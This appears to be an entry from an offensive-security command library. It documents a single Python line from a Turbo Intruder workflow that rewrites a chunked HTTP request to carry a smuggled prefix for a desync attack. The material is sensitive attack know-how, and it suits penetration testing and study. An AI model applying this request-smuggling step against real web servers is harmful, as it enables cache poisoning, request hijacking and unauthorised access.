---
data: >-
  attack = target.req.replace('0\r\n\r\n',
  chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
tags:
  - scripting
  - http-smuggling
type: command
executor: python
platforms:
  - Web
id: b7818f0c-7ca8-4360-8a6b-c0acc0d12934
created_at: '2025-12-13T09:01:22.459Z'
updated_at: '2025-12-13T09:01:22.459Z'
verified: false
validated: true
submitted: true
---
# Build Desync Attack Request

## Command

```python
attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
```

## Description

Modifies the base request to include the chunked smuggled data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `replace` | Replaces ending with chunked data | Yes |

## Examples

### Basic Usage

```python
attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
```

## Expected Output

Modified attack request string.

## Related

- [[procedures/Prepare-Turbo-Intruder-Desync-Script]]
